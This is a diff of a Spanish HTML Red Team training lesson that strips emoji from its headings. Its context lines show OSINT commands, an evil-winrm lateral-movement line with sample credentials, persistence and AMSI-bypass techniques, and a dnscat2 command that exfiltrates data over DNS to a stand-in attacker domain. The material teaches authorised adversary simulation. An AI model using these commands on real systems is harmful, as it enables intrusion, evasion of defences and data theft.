@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
@@ -27,7 +27,7 @@
                 <strong>MITRE ATT&CK</strong>.
             </p>
         </div>
-        <div class="lesson-toc"><h3>📋 Contenido de esta lección</h3>
+        <div class="lesson-toc"><h3>Contenido de esta lección</h3>
             <ol>
                 <li><a href="#que-es-redteam">¿Qué es Red Team?</a></li>
                 <li><a href="#vs-pentest">Red Team vs Pentesting</a></li>
@@ -45,7 +45,7 @@
             </ol>
         </div>
 
-        <div class="lesson-section" id="que-es-redteam"><h2><span class="section-icon">🎯</span> 1. ¿Qué es Red Team?</h2>
+        <div class="lesson-section" id="que-es-redteam"><h2>1. ¿Qué es Red Team?</h2>
             <p class="lesson-text">Un <strong>Red Team</strong> es un equipo que simula ser un adversario real (APT, cibercriminal, insider) para probar la seguridad de una organización de forma <strong>integral</strong>: tecnología, procesos y personas.</p>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Equipo</th><th>Rol</th><th>Objetivo</th></tr></thead>
                 <tbody>
@@ -57,7 +57,7 @@
             </table></div>
         </div>
 
-        <div class="lesson-section" id="vs-pentest"><h2><span class="section-icon">⚔️</span> 2. Red Team vs Pentesting</h2>
+        <div class="lesson-section" id="vs-pentest"><h2>2. Red Team vs Pentesting</h2>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Aspecto</th><th>Pentesting</th><th>Red Team</th></tr></thead>
                 <tbody>
                     <tr><td><strong>Objetivo</strong></td><td>Encontrar vulnerabilidades técnicas</td><td>Probar la capacidad de detección y respuesta</td></tr>
@@ -71,7 +71,7 @@
             </table></div>
         </div>
 
-        <div class="lesson-section" id="mitre"><h2><span class="section-icon">🗺️</span> 3. MITRE ATT&CK: el mapa del atacante</h2>
+        <div class="lesson-section" id="mitre"><h2>3. MITRE ATT&CK: el mapa del atacante</h2>
             <p class="lesson-text"><strong>MITRE ATT&CK</strong> es una base de conocimiento que categoriza las tácticas y técnicas que usan los adversarios reales. Es tu guía para planificar operaciones de Red Team.</p>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Táctica</th><th>Pregunta que responde</th><th>Ejemplo de técnica</th></tr></thead>
                 <tbody>
@@ -92,7 +92,7 @@
             </table></div>
         </div>
 
-        <div class="lesson-section" id="kill-chain"><h2><span class="section-icon">⛓️</span> 4. Cyber Kill Chain</h2>
+        <div class="lesson-section" id="kill-chain"><h2>4. Cyber Kill Chain</h2>
             <div class="lesson-diagram"><pre>
     Cyber Kill Chain (Lockheed Martin):
     
@@ -107,9 +107,9 @@
             </pre><p class="diagram-caption">Cada eslabón roto detiene el ataque — la defensa en profundidad funciona</p></div>
         </div>
 
-        <div class="lesson-section" id="planificacion"><h2><span class="section-icon">📋</span> 5. Planificación de una operación</h2>
+        <div class="lesson-section" id="planificacion"><h2>5. Planificación de una operación</h2>
             <p class="lesson-text">Antes de cualquier ataque, necesitas un <strong>Rules of Engagement (RoE)</strong> firmado:</p>
-            <div class="lesson-callout"><strong>📌 Elementos del RoE:</strong>
+            <div class="lesson-callout"><strong>Elementos del RoE:</strong>
                 <ul>
                     <li><strong>Alcance</strong>: ¿Qué sistemas, redes y personas están incluidas?</li>
                     <li><strong>Exclusiones</strong>: ¿Qué NO se puede atacar? (sistemas críticos de producción)</li>
@@ -121,7 +121,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="reconocimiento"><h2><span class="section-icon">🔍</span> 6. Reconocimiento (OSINT)</h2>
+        <div class="lesson-section" id="reconocimiento"><h2>6. Reconocimiento (OSINT)</h2>
             <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">OSINT</span></div>
                 <pre><code><span style="color:#546e7a"># Reconocimiento pasivo de dominios</span>
 <span style="color:#00e676">$</span> amass enum -passive -d empresa.com
@@ -143,7 +143,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="acceso-inicial"><h2><span class="section-icon">🚪</span> 7. Acceso inicial y ejecución</h2>
+        <div class="lesson-section" id="acceso-inicial"><h2>7. Acceso inicial y ejecución</h2>
             <p class="lesson-text">Las técnicas más comunes de acceso inicial en Red Team:</p>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Técnica</th><th>Descripción</th><th>Herramientas</th></tr></thead>
                 <tbody>
@@ -162,7 +162,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="movimiento"><h2><span class="section-icon">🏃</span> 8. Movimiento lateral y escalada</h2>
+        <div class="lesson-section" id="movimiento"><h2>8. Movimiento lateral y escalada</h2>
             <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Movimiento lateral</span></div>
                 <pre><code><span style="color:#546e7a"># Moverse a otra máquina via WinRM</span>
 <span style="color:#00e676">$</span> evil-winrm -i 10.10.10.5 -u admin -p 'Password123'
@@ -180,7 +180,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="persistencia"><h2><span class="section-icon">🔗</span> 9. Persistencia y evasión</h2>
+        <div class="lesson-section" id="persistencia"><h2>9. Persistencia y evasión</h2>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Técnica de persistencia</th><th>Descripción</th></tr></thead>
                 <tbody>
                     <tr><td><strong>Scheduled Tasks</strong></td><td>Crear tarea programada que ejecute tu beacon</td></tr>
@@ -191,7 +191,7 @@
                     <tr><td><strong>Webshell</strong></td><td>Shell en el servidor web (PHP, ASPX)</td></tr>
                 </tbody>
             </table></div>
-            <div class="lesson-callout"><strong>🕵️ Técnicas de evasión:</strong>
+            <div class="lesson-callout"><strong>Técnicas de evasión:</strong>
                 <ul>
                     <li><strong>AMSI Bypass</strong>: Deshabilitar el Antimalware Scan Interface de Windows</li>
                     <li><strong>Obfuscation</strong>: Ofuscar payloads con herramientas como <code>ScareCrow</code></li>
@@ -202,7 +202,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="exfiltracion"><h2><span class="section-icon">📤</span> 10. Exfiltración de datos</h2>
+        <div class="lesson-section" id="exfiltracion"><h2>10. Exfiltración de datos</h2>
             <div class="lesson-terminal"><div class="term-header"><span class="dot red"></span><span class="dot yellow"></span><span class="dot green"></span><span class="term-title">Exfiltración</span></div>
                 <pre><code><span style="color:#546e7a"># Exfiltración por DNS (difícil de detectar)</span>
 <span style="color:#00e676">$</span> dnscat2 --dns server=tudominio.com
@@ -215,7 +215,7 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="c2"><h2><span class="section-icon">🖥️</span> 11. Infraestructura C2</h2>
+        <div class="lesson-section" id="c2"><h2>11. Infraestructura C2</h2>
             <p class="lesson-text">Un <strong>Command & Control (C2)</strong> es el servidor desde el cual controlas los sistemas comprometidos.</p>
             <div class="lesson-table-wrap"><table class="lesson-table"><thead><tr><th>Framework C2</th><th>Tipo</th><th>Características</th></tr></thead>
                 <tbody>
@@ -243,8 +243,8 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="reporte"><h2><span class="section-icon">📝</span> 12. Reporte de Red Team</h2>
-            <div class="lesson-callout"><strong>📌 Estructura del reporte:</strong>
+        <div class="lesson-section" id="reporte"><h2>12. Reporte de Red Team</h2>
+            <div class="lesson-callout"><strong>Estructura del reporte:</strong>
                 <ol>
                     <li><strong>Resumen ejecutivo</strong>: Para directivos. ¿Se logró el objetivo? ¿Cuál es el riesgo real?</li>
                     <li><strong>Narrativa del ataque</strong>: Historia completa paso a paso, con timeline</li>
@@ -256,8 +256,8 @@
             </div>
         </div>
 
-        <div class="lesson-section" id="practica"><h2><span class="section-icon">🏋️</span> 13. Práctica</h2>
-            <div class="practice-box"><h4>✅ ¿Completaste esta lección?</h4>
+        <div class="lesson-section" id="practica"><h2>13. Práctica</h2>
+            <div class="practice-box"><h4>¿Completaste esta lección?</h4>
                 <ul>
                     <li>Entiendes la diferencia entre Red Team y Pentesting</li>
                     <li>Conoces las 14 tácticas de MITRE ATT&CK</li>
